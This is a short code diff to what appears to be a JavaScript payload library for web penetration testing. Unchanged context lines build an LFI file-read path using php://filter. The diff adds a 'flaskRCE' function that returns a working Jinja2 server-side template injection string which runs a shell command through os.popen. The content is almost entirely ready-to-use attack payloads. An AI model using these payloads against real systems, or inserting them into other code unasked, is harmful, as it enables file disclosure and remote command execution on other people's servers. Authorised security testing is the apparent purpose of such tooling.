@@ -141,3 +141,10 @@ window.Payload.LFI = {
     return 'php://filter/convert.base64-encode/resource=' + value
   }
 }
+
+window.Payload.SSTI = {
+  flaskRCE: (value) => {
+    // Reference: https://twitter.com/realgam3/status/1184747565415358469
+    return "{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}"
+  }
+}
